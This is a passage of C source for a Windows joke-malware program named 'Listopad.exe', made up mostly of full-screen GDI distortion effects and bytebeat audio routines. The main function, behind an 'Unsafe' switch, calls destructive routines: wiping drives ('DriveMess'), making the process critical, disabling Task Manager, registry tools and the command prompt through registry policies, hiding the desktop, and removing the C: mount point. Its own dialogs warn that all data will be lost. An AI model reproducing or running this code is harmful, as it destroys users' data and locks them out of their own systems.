		SIZE szWnd = { w, h };

		UpdateLayeredWindow( hwndLayered, hdcWnd, &ptWnd, &szWnd, hdcTemp, &ptWnd, RGB( 0, 0, 0 ), NULL, ULW_COLORKEY );

		ReleaseDC( HWND_DESKTOP, hdcWnd );

		Sleep( 1 );
	}
}

DWORD
WINAPI
GdiPayload3(
	_In_ LPVOID lpvThreadParameter
)
{
	UNREFERENCED_PARAMETER( lpvThreadParameter );

	for ( INT t = 0; ; t++ )
	{
		INT w = GetSystemMetrics( SM_CXVIRTUALSCREEN ),
			h = GetSystemMetrics( SM_CYVIRTUALSCREEN );

		HDC hdcDesk = GetDC( HWND_DESKTOP );

		/*		Bwiswexual! OwO - Sapphire, 7 / 12 / 2026		*/
		BITMAPINFO biSexual = { 0 };

		biSexual.bmiHeader.biSize				= sizeof( biSexual );
		biSexual.bmiHeader.biWidth				= w;
		biSexual.bmiHeader.biHeight				= h;
		biSexual.bmiHeader.biPlanes				= 1;
		biSexual.bmiHeader.biBitCount			= 32;

		PRGBQUAD prgbDst;

		HDC hdcTemp = CreateCompatibleDC( hdcDesk );
		HBITMAP hbm = CreateDIBSection( hdcDesk, &biSexual, DIB_RGB_COLORS, &prgbDst, NULL, 0 );

		SelectObject( hdcTemp, hbm );

		BitBlt( hdcTemp, 0, 0, w, h, hdcDesk, 0, 0, SRCCOPY );

		for ( INT y = 0; y < h; y++ )
			for ( INT x = 0; x < w; x++ )
			{
				_RGBQUAD rgbDst = prgbDst[ y * w + x ];
				rgbDst.r -= 31, rgbDst.g -= 31, rgbDst.b -= 31;

				prgbDst[ y * w + x ] = rgbDst;
			}

		BitBlt( hdcDesk, 0, 0, w, h, hdcTemp, 0, 0, SRCCOPY );

		DeleteObject( hbm );
		DeleteDC( hdcTemp );

		ReleaseDC( HWND_DESKTOP, hdcDesk );

		Sleep( 1 );
	}
}

DWORD
WINAPI
ExtraGdiPayload3(
	_In_ LPVOID lpvThreadParameter
)
{
	UNREFERENCED_PARAMETER( lpvThreadParameter );

	WNDCLASS wc = { 0 };

	HMODULE hmodHandle = GetModuleHandle( NULL );

	INT w = GetSystemMetrics( SM_CXVIRTUALSCREEN ),
		h = GetSystemMetrics( SM_CYVIRTUALSCREEN );

	HDC hdcDesk = GetDC( HWND_DESKTOP );

	HDC hdcTemp = CreateCompatibleDC( hdcDesk );
	HBITMAP hbm = CreateCompatibleBitmap( hdcDesk, w, h );

	SelectObject( hdcTemp, hbm );

	wc.lpfnWndProc				= DefWindowProc;
	wc.hInstance				= hmodHandle;
	wc.lpszClassName			= TEXT( "class" );

	RegisterClass( &wc );

	HWND hwndLayered = CreateWindowEx( WS_EX_TOOLWINDOW | WS_EX_LAYERED | WS_EX_TRANSPARENT | WS_EX_TOPMOST, wc.lpszClassName, TEXT( "window" ), WS_POPUP, 0, 0, w, h, HWND_DESKTOP, NULL, hmodHandle, NULL );
	ShowWindow( hwndLayered, SW_SHOW );

	MSG Msg = { 0 };

	while ( Msg.message != WM_QUIT )
	{
		if ( PeekMessage( &Msg, HWND_DESKTOP, 0, 0, PM_REMOVE ) )
		{
			TranslateMessage( &Msg );
			DispatchMessage( &Msg );
		}

		HDC hdcWnd = GetDC( HWND_DESKTOP );

		BitBlt( hdcWnd, 0, 0, w, h, hdcWnd, 0, 0, SRCCOPY );
		StretchBlt( hdcTemp, 0, 0, w, h, hdcWnd, w, 0, -w, h, SRCINVERT );

		POINT ptWnd = { 0, 0 };
		SIZE szWnd = { w, h };

		UpdateLayeredWindow( hwndLayered, hdcWnd, &ptWnd, &szWnd, hdcTemp, &ptWnd, RGB( 0, 0, 0 ), NULL, ULW_COLORKEY );

		ReleaseDC( HWND_DESKTOP, hdcWnd );

		Sleep( 1 );
	}
}

DWORD
WINAPI
GdiPayload4(
	_In_ LPVOID lpvThreadParameter
)
{
	UNREFERENCED_PARAMETER( lpvThreadParameter );

	FLOAT fAngle = 0.0f;

	for ( INT t = 0; ; t++ )
	{
		INT w = GetSystemMetrics( SM_CXVIRTUALSCREEN ),
			h = GetSystemMetrics( SM_CYVIRTUALSCREEN );

		HDC hdcDesk = GetDC( HWND_DESKTOP );

		/*		Bwiswexual! OwO - Sapphire, 7 / 12 / 2026		*/
		BITMAPINFO biSexual = { 0 };

		biSexual.bmiHeader.biSize				= sizeof( biSexual );
		biSexual.bmiHeader.biWidth				= w;
		biSexual.bmiHeader.biHeight				= h;
		biSexual.bmiHeader.biPlanes				= 1;
		biSexual.bmiHeader.biBitCount			= 32;

		PRGBQUAD prgbDst;

		HDC hdcTemp = CreateCompatibleDC( hdcDesk );
		HBITMAP hbm = CreateDIBSection( hdcDesk, &biSexual, DIB_RGB_COLORS, &prgbDst, NULL, 0 );

		SelectObject( hdcTemp, hbm );

		BitBlt( hdcTemp, 0, 0, w, h, hdcDesk, 0, 0, SRCCOPY );

		for ( INT y = 0; y < h; y++ )
			for ( INT x = 0; x < w; x++ )
			{
				_RGBQUAD rgbDst = prgbDst[ y * w + x ];

				INT cx = abs( x - ( w / 2 ) );
				INT cy = abs( y - ( h / 2 ) );

				INT zx = cosf( fAngle ) * cx - sinf( fAngle ) * cy;
				INT zy = sinf( fAngle ) * cx + cosf( fAngle ) * cy;

				INT iFormula = ( ( zx + zy ) * ( ( zx + t ) ^ abs( zy + t ) ) ) / 1000;

				rgbDst.g -= iFormula, rgbDst.b = iFormula;

				prgbDst[ y * w + x ] = rgbDst;
			}

		BitBlt( hdcDesk, 0, 0, w, h, hdcTemp, 0, 0, SRCCOPY );

		DeleteObject( hbm );
		DeleteDC( hdcTemp );

		ReleaseDC( HWND_DESKTOP, hdcDesk );

		fAngle += 1.f / 100.f;

		Sleep( 1 );
	}
}

DWORD
WINAPI
GdiPayload5(
	_In_ LPVOID lpvThreadParameter
)
{
	UNREFERENCED_PARAMETER( lpvThreadParameter );

	WNDCLASS wc = { 0 };

	HMODULE hmodHandle = GetModuleHandle( NULL );

	INT w = GetSystemMetrics( SM_CXVIRTUALSCREEN ),
		h = GetSystemMetrics( SM_CYVIRTUALSCREEN );

	HDC hdcDesk = GetDC( HWND_DESKTOP );

	HDC hdcTemp = CreateCompatibleDC( hdcDesk );
	HBITMAP hbm = CreateCompatibleBitmap( hdcDesk, w, h );

	SelectObject( hdcTemp, hbm );

	wc.lpfnWndProc				= DefWindowProc;
	wc.hInstance				= hmodHandle;
	wc.lpszClassName			= TEXT( "class" );

	RegisterClass( &wc );

	HWND hwndLayered = CreateWindowEx( WS_EX_TOOLWINDOW | WS_EX_LAYERED | WS_EX_TRANSPARENT | WS_EX_TOPMOST, wc.lpszClassName, TEXT( "window" ), WS_POPUP, 0, 0, w, h, HWND_DESKTOP, NULL, hmodHandle, NULL );
	ShowWindow( hwndLayered, SW_SHOW );

	MSG Msg = { 0 };

	while ( Msg.message != WM_QUIT )
	{
		if ( PeekMessage( &Msg, HWND_DESKTOP, 0, 0, PM_REMOVE ) )
		{
			TranslateMessage( &Msg );
			DispatchMessage( &Msg );
		}

		HDC hdcWnd = GetDC( HWND_DESKTOP );

		BitBlt( hdcWnd, 0, 0, w, h, hdcWnd, 0, 0, SRCCOPY );
		BitBlt( hdcTemp, Random( ) % 10, Random( ) % 10, w, h, hdcWnd, Random( ) % 10, Random( ) % 10, SRCINVERT );

		POINT ptWnd = { 0, 0 };
		SIZE szWnd = { w, h };

		UpdateLayeredWindow( hwndLayered, hdcWnd, &ptWnd, &szWnd, hdcTemp, &ptWnd, RGB( 0, 0, 0 ), NULL, ULW_COLORKEY );

		ReleaseDC( HWND_DESKTOP, hdcWnd );

		Sleep( 1 );
	}
}

DWORD
WINAPI
GdiPayload6(
	_In_ LPVOID lpvThreadParameter
)
{
	UNREFERENCED_PARAMETER( lpvThreadParameter );

	for ( INT t = 0; ; t++ )
	{
		INT w = GetSystemMetrics( SM_CXVIRTUALSCREEN ),
			h = GetSystemMetrics( SM_CYVIRTUALSCREEN );

		HDC hdcDesk = GetDC( HWND_DESKTOP );

		/*		Bwiswexual! OwO - Sapphire, 7 / 12 / 2026		*/
		BITMAPINFO biSexual = { 0 };

		biSexual.bmiHeader.biSize				= sizeof( biSexual );
		biSexual.bmiHeader.biWidth				= w;
		biSexual.bmiHeader.biHeight				= h;
		biSexual.bmiHeader.biPlanes				= 1;
		biSexual.bmiHeader.biBitCount			= 32;

		PRGBQUAD prgbDst;

		HDC hdcTemp = CreateCompatibleDC( hdcDesk );
		HBITMAP hbm = CreateDIBSection( hdcDesk, &biSexual, DIB_RGB_COLORS, &prgbDst, NULL, 0 );

		SelectObject( hdcTemp, hbm );

		BitBlt( hdcTemp, 0, 0, w, h, hdcDesk, 0, 0, SRCAND );

		for ( INT i = 0; i < w * h; i++ )
		{
			INT x = i % w, y = i / w;

			FLOAT frcx = ( 2.5f / w );
			FLOAT frcy = ( 1.9f / h );

			FLOAT cx = x * frcx - 2.f;
			FLOAT cy = y * frcy - .95f;

			FLOAT zx = 0;
			FLOAT zy = 0;

			INT fx = 0;

			while ( ( ( zx * zx ) + ( zy * zy ) ) < 10.f && fx < 50 )
			{
				_RGBQUAD rgbDst = prgbDst[ i ];

				FLOAT fczx = zx * zx - zy * zy + cx;
				FLOAT fczy = 2 * zx * zy + cy;

				zx = fczx;
				zy = fczy;

				fx++;

				rgbDst.r = rand( ) % fx;
				rgbDst.g = rand( ) % fx;
				rgbDst.b = rand( ) % fx;

				rgbDst.rgb += 2;

				prgbDst[ i ] = rgbDst;
			}
		}

		BitBlt( hdcDesk, 0, 0, w, h, hdcTemp, 0, 0, SRCCOPY );

		DeleteObject( hbm );
		DeleteDC( hdcTemp );

		ReleaseDC( HWND_DESKTOP, hdcDesk );

		Sleep( 1 );
	}
}

VOID
WINAPI
AudioSequence1( VOID )
{
	HWAVEOUT hWaveOut;

	WAVEFORMATEX waveFormat = { 0 };
	WAVEHDR waveHdr = { 0 };

	INT iHertz, iDuration;
	SIZE_T nSize;

	HANDLE hHeap;
	LPSTR lpBuffer;

	iHertz = 8000, iDuration = 29;
	nSize = iHertz * iDuration;

	waveFormat.wFormatTag				= WAVE_FORMAT_PCM;
	waveFormat.nChannels				= 1;
	waveFormat.nSamplesPerSec			= iHertz;
	waveFormat.wBitsPerSample			= 8;
	waveFormat.cbSize					= 0;
	waveFormat.nBlockAlign				= ( waveFormat.nChannels * waveFormat.wBitsPerSample ) / 8;
	waveFormat.nAvgBytesPerSec			= waveFormat.nSamplesPerSec * waveFormat.nBlockAlign;

	waveOutOpen( &hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0 );

	hHeap = GetProcessHeap( );
	lpBuffer = HeapAlloc( hHeap, 0, nSize );

	for ( INT t = 0; t < nSize; t++ )
		lpBuffer[ t ] = ( CHAR )(
			t / 80 * ( ( t >> 10 ) ^ ( t >> 11 ) ^ ( ( ( t * 2 ) >> ( t * 4 ) ) >> 4 ) )
			);

	waveHdr.lpData					= lpBuffer;
	waveHdr.dwBufferLength			= nSize;

	waveOutPrepareHeader( hWaveOut, &waveHdr, sizeof( waveHdr ) );
	waveOutWrite( hWaveOut, &waveHdr, sizeof( waveHdr ) );

	waveOutUnprepareHeader( hWaveOut, &waveHdr, sizeof( waveHdr ) );
	waveOutClose( hWaveOut );

	HeapFree( hHeap, 0, lpBuffer );
}

VOID
WINAPI
AudioSequence2( VOID )
{
	HWAVEOUT hWaveOut;

	WAVEFORMATEX waveFormat = { 0 };
	WAVEHDR waveHdr = { 0 };

	INT iHertz, iDuration;
	SIZE_T nSize;

	HANDLE hHeap;
	LPSTR lpBuffer;

	iHertz = 8000, iDuration = 29;
	nSize = iHertz * iDuration;

	waveFormat.wFormatTag				= WAVE_FORMAT_PCM;
	waveFormat.nChannels				= 1;
	waveFormat.nSamplesPerSec			= iHertz;
	waveFormat.wBitsPerSample			= 8;
	waveFormat.cbSize					= 0;
	waveFormat.nBlockAlign				= ( waveFormat.nChannels * waveFormat.wBitsPerSample ) / 8;
	waveFormat.nAvgBytesPerSec			= waveFormat.nSamplesPerSec * waveFormat.nBlockAlign;

	waveOutOpen( &hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0 );

	hHeap = GetProcessHeap( );
	lpBuffer = HeapAlloc( hHeap, 0, nSize );

	for ( INT t = 0; t < nSize; t++ )
		lpBuffer[ t ] = ( CHAR )(
			tan( t >> 1 ) * ( t >> 6 )
			);

	waveHdr.lpData					= lpBuffer;
	waveHdr.dwBufferLength			= nSize;

	waveOutPrepareHeader( hWaveOut, &waveHdr, sizeof( waveHdr ) );
	waveOutWrite( hWaveOut, &waveHdr, sizeof( waveHdr ) );

	waveOutUnprepareHeader( hWaveOut, &waveHdr, sizeof( waveHdr ) );
	waveOutClose( hWaveOut );

	HeapFree( hHeap, 0, lpBuffer );
}

VOID
WINAPI
AudioSequence3( VOID )
{
	HWAVEOUT hWaveOut;

	WAVEFORMATEX waveFormat = { 0 };
	WAVEHDR waveHdr = { 0 };

	INT iHertz, iDuration;
	SIZE_T nSize;

	HANDLE hHeap;
	LPSTR lpBuffer;

	iHertz = 8000, iDuration = 29;
	nSize = iHertz * iDuration;

	waveFormat.wFormatTag				= WAVE_FORMAT_PCM;
	waveFormat.nChannels				= 1;
	waveFormat.nSamplesPerSec			= iHertz;
	waveFormat.wBitsPerSample			= 8;
	waveFormat.cbSize					= 0;
	waveFormat.nBlockAlign				= ( waveFormat.nChannels * waveFormat.wBitsPerSample ) / 8;
	waveFormat.nAvgBytesPerSec			= waveFormat.nSamplesPerSec * waveFormat.nBlockAlign;

	waveOutOpen( &hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0 );

	hHeap = GetProcessHeap( );
	lpBuffer = HeapAlloc( hHeap, 0, nSize );

	for ( INT t = 0; t < nSize; t++ )
		lpBuffer[ t ] = ( CHAR )(
			2 * ( t >> 5 ^ t ) ^ ( t >> 5 ) + t * ( t >> 14 & 14 )
			);

	waveHdr.lpData					= lpBuffer;
	waveHdr.dwBufferLength			= nSize;

	waveOutPrepareHeader( hWaveOut, &waveHdr, sizeof( waveHdr ) );
	waveOutWrite( hWaveOut, &waveHdr, sizeof( waveHdr ) );

	waveOutUnprepareHeader( hWaveOut, &waveHdr, sizeof( waveHdr ) );
	waveOutClose( hWaveOut );

	HeapFree( hHeap, 0, lpBuffer );
}

VOID
WINAPI
AudioSequence4( VOID )
{
	HWAVEOUT hWaveOut;

	WAVEFORMATEX waveFormat = { 0 };
	WAVEHDR waveHdr = { 0 };

	INT iHertz, iDuration;
	SIZE_T nSize;

	HANDLE hHeap;
	LPSTR lpBuffer;

	iHertz = 8000, iDuration = 29;
	nSize = iHertz * iDuration;

	waveFormat.wFormatTag				= WAVE_FORMAT_PCM;
	waveFormat.nChannels				= 1;
	waveFormat.nSamplesPerSec			= iHertz;
	waveFormat.wBitsPerSample			= 8;
	waveFormat.cbSize					= 0;
	waveFormat.nBlockAlign				= ( waveFormat.nChannels * waveFormat.wBitsPerSample ) / 8;
	waveFormat.nAvgBytesPerSec			= waveFormat.nSamplesPerSec * waveFormat.nBlockAlign;

	waveOutOpen( &hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0 );

	hHeap = GetProcessHeap( );
	lpBuffer = HeapAlloc( hHeap, 0, nSize );

	for ( INT t = 0; t < nSize; t++ )
		lpBuffer[ t ] = ( CHAR )(
			t + ( ( t * ( t ^ ( t >> ( ( t | 49152 ) >> 14 ) ) + 3 ) ) >> 8 )
			);

	waveHdr.lpData					= lpBuffer;
	waveHdr.dwBufferLength			= nSize;

	waveOutPrepareHeader( hWaveOut, &waveHdr, sizeof( waveHdr ) );
	waveOutWrite( hWaveOut, &waveHdr, sizeof( waveHdr ) );

	waveOutUnprepareHeader( hWaveOut, &waveHdr, sizeof( waveHdr ) );
	waveOutClose( hWaveOut );

	HeapFree( hHeap, 0, lpBuffer );
}

VOID
WINAPI
AudioSequence5( VOID )
{
	HWAVEOUT hWaveOut;

	WAVEFORMATEX waveFormat = { 0 };
	WAVEHDR waveHdr = { 0 };

	INT iHertz, iDuration;
	SIZE_T nSize;

	HANDLE hHeap;
	LPSTR lpBuffer;

	iHertz = 32000, iDuration = 29;
	nSize = iHertz * iDuration;

	waveFormat.wFormatTag				= WAVE_FORMAT_PCM;
	waveFormat.nChannels				= 1;
	waveFormat.nSamplesPerSec			= iHertz;
	waveFormat.wBitsPerSample			= 8;
	waveFormat.cbSize					= 0;
	waveFormat.nBlockAlign				= ( waveFormat.nChannels * waveFormat.wBitsPerSample ) / 8;
	waveFormat.nAvgBytesPerSec			= waveFormat.nSamplesPerSec * waveFormat.nBlockAlign;

	waveOutOpen( &hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0 );

	hHeap = GetProcessHeap( );
	lpBuffer = HeapAlloc( hHeap, 0, nSize );

	for ( INT t = 0; t < nSize; t++ )
		lpBuffer[ t ] = ( CHAR )(
			( t >> 8 ) ^ ( ( t * ( ( ( t ^ 15360 ) >> 10 ) + 1 ) ) >> 6 )
			);

	waveHdr.lpData					= lpBuffer;
	waveHdr.dwBufferLength			= nSize;

	waveOutPrepareHeader( hWaveOut, &waveHdr, sizeof( waveHdr ) );
	waveOutWrite( hWaveOut, &waveHdr, sizeof( waveHdr ) );

	waveOutUnprepareHeader( hWaveOut, &waveHdr, sizeof( waveHdr ) );
	waveOutClose( hWaveOut );

	HeapFree( hHeap, 0, lpBuffer );
}

VOID
WINAPI
AudioSequence6( VOID )
{
	HWAVEOUT hWaveOut;

	WAVEFORMATEX waveFormat = { 0 };
	WAVEHDR waveHdr = { 0 };

	INT iHertz, iDuration;
	SIZE_T nSize;

	HANDLE hHeap;
	LPSTR lpBuffer;

	iHertz = 32000, iDuration = 29;
	nSize = iHertz * iDuration;

	waveFormat.wFormatTag				= WAVE_FORMAT_PCM;
	waveFormat.nChannels				= 1;
	waveFormat.nSamplesPerSec			= iHertz;
	waveFormat.wBitsPerSample			= 8;
	waveFormat.cbSize					= 0;
	waveFormat.nBlockAlign				= ( waveFormat.nChannels * waveFormat.wBitsPerSample ) / 8;
	waveFormat.nAvgBytesPerSec			= waveFormat.nSamplesPerSec * waveFormat.nBlockAlign;

	waveOutOpen( &hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0 );

	hHeap = GetProcessHeap( );
	lpBuffer = HeapAlloc( hHeap, 0, nSize );

	for ( INT t = 0; t < nSize; t++ )
		lpBuffer[ t ] = ( CHAR )(
			tan( t * t ) + tan( t >> 6 )
			);

	waveHdr.lpData					= lpBuffer;
	waveHdr.dwBufferLength			= nSize;

	waveOutPrepareHeader( hWaveOut, &waveHdr, sizeof( waveHdr ) );
	waveOutWrite( hWaveOut, &waveHdr, sizeof( waveHdr ) );

	waveOutUnprepareHeader( hWaveOut, &waveHdr, sizeof( waveHdr ) );
	waveOutClose( hWaveOut );

	HeapFree( hHeap, 0, lpBuffer );
}

static
LONG
WINAPI
GlobalCrashHandler(
	_In_ PEXCEPTION_POINTERS ExceptionInfo
)
{
	DWORD dwCode = ExceptionInfo->ExceptionRecord->ExceptionCode;

	if ( dwCode == EXCEPTION_INT_DIVIDE_BY_ZERO ||
		dwCode == EXCEPTION_ACCESS_VIOLATION )
	{

	}

#ifdef _M_AMD64
	ExceptionInfo->ContextRecord->Rip += 1;
#else
	ExceptionInfo->ContextRecord->Eip += 1;
#endif

	return EXCEPTION_CONTINUE_EXECUTION;
}

INT
WINAPI
wWinMain(
	_In_			HINSTANCE		hInstance,
	_In_opt_		HINSTANCE		hPrevInstance,
	_In_			LPWSTR			lpCmdLine,
	_In_			INT				nShowCmd
)
{
	UNREFERENCED_PARAMETER( hInstance );
	UNREFERENCED_PARAMETER( hPrevInstance );
	UNREFERENCED_PARAMETER( lpCmdLine );
	UNREFERENCED_PARAMETER( nShowCmd );

	SetUnhandledExceptionFilter( GlobalCrashHandler );

	if ( MessageBox( HWND_DESKTOP, TEXT( "you are safe until you close me." ), TEXT( "Listopad.exe by voidersvoid" ), MB_YESNO | MB_SYSTEMMODAL ) == IDNO )
		ExitProcess( EXIT_SUCCESS );

#ifdef Unsafe
	CloseHandle( CreateThread( NULL, 0, Unmount, NULL, 0, NULL ) );
#endif

	if ( MessageBox( HWND_DESKTOP, TEXT( "are you sure you want to run the end of your whole computer?\nyou will lose all data on all drives if you proceed!" ), TEXT( "Listopad.exe by voidersvoid" ), MB_YESNO | MB_SYSTEMMODAL ) == IDNO )
		ExitProcess( EXIT_SUCCESS );

	DWORD dwSeed = GetTickCount( );
	srand( dwSeed );

#ifdef Unsafe
	DriveMess( );

#ifdef Archx64
	ProcessIsCritical( );
#endif

	RegistryAdd( HKEY_CURRENT_USER, TEXT( "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" ), TEXT( "DisableTaskMgr" ), REG_DWORD, 0x00000001 );
	RegistryAdd( HKEY_CURRENT_USER, TEXT( "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" ), TEXT( "DisableRegistryTools" ), REG_DWORD, 0x00000001 );
	RegistryAdd( HKEY_CURRENT_USER, TEXT( "SOFTWARE\\Policies\\Microsoft\\Windows\\System" ), TEXT( "DisableCMD" ), REG_DWORD, 0x00000002 );

	Sleep( 5'000 );
#endif
	CloseHandle( CreateThread( NULL, 0, RandomMessageBox, NULL, 0, NULL ) );

#ifdef Unsafe
	Sleep( 5'000 );
	CloseHandle( CreateThread( NULL, 0, HideDesktop, NULL, 0, NULL ) );
#endif

	HANDLE hGdiPayload1 = CreateThread( NULL, 0, GdiPayload1, NULL, 0, NULL );
	AudioSequence1( );

	Sleep( 30'000 );

	TerminateThread( hGdiPayload1, 0 );
	CloseHandle( hGdiPayload1 );

	InvalidateRect( HWND_DESKTOP, NULL, FALSE );

	HANDLE hGdiPayload2 = CreateThread( NULL, 0, GdiPayload2, NULL, 0, NULL ),
		hExtraGdiPayload2 = CreateThread( NULL, 0, ExtraGdiPayload2, NULL, 0, NULL );

	AudioSequence2( );

	Sleep( 30'000 );

	TerminateThread( hGdiPayload2, 0 );
	CloseHandle( hGdiPayload2 );

	TerminateThread( hExtraGdiPayload2, 0 );
	CloseHandle( hExtraGdiPayload2 );

	InvalidateRect( HWND_DESKTOP, NULL, FALSE );

	HANDLE hGdiPayload3 = CreateThread( NULL, 0, GdiPayload3, NULL, 0, NULL ),
		hExtraGdiPayload3 = CreateThread( NULL, 0, ExtraGdiPayload3, NULL, 0, NULL );

	AudioSequence3( );

	Sleep( 30'000 );

	TerminateThread( hGdiPayload3, 0 );
	CloseHandle( hGdiPayload3 );

	TerminateThread( hExtraGdiPayload3, 0 );
	CloseHandle( hExtraGdiPayload3 );

	InvalidateRect( HWND_DESKTOP, NULL, FALSE );

	CloseHandle( CreateThread( NULL, 0, RenderCube, NULL, 0, NULL ) );

	HANDLE hGdiPayload4 = CreateThread( NULL, 0, GdiPayload4, NULL, 0, NULL );

	AudioSequence4( );

	Sleep( 30'000 );

	TerminateThread( hGdiPayload4, 0 );
	CloseHandle( hGdiPayload4 );

	InvalidateRect( HWND_DESKTOP, NULL, FALSE );

	CloseHandle( CreateThread( NULL, 0, Texts, NULL, 0, NULL ) );

	HANDLE hGdiPayload5 = CreateThread( NULL, 0, GdiPayload5, NULL, 0, NULL );

	AudioSequence5( );

	Sleep( 30'000 );

	TerminateThread( hGdiPayload5, 0 );
	CloseHandle( hGdiPayload5 );

	InvalidateRect( HWND_DESKTOP, NULL, FALSE );

	CloseHandle( CreateThread( NULL, 0, WindowMess, NULL, 0, NULL ) );
	CloseHandle( CreateThread( NULL, 0, WindowMove, NULL, 0, NULL ) );

	CloseHandle( CreateThread( NULL, 0, RandomMessageBoxes, NULL, 0, NULL ) );

	CloseHandle( CreateThread( NULL, 0, DarkBright, NULL, 0, NULL ) );

	HANDLE hGdiPayload6 = CreateThread( NULL, 0, GdiPayload6, NULL, 0, NULL );

	AudioSequence6( );

	Sleep( 30'000 );

	TerminateThread( hGdiPayload6, 0 );
	CloseHandle( hGdiPayload6 );

	InvalidateRect( HWND_DESKTOP, NULL, FALSE );

#ifdef Unsafe
	DeleteVolumeMountPoint( TEXT( "C:\\" ) );
#endif

	Sleep( INFINITE );

	return 0;
}
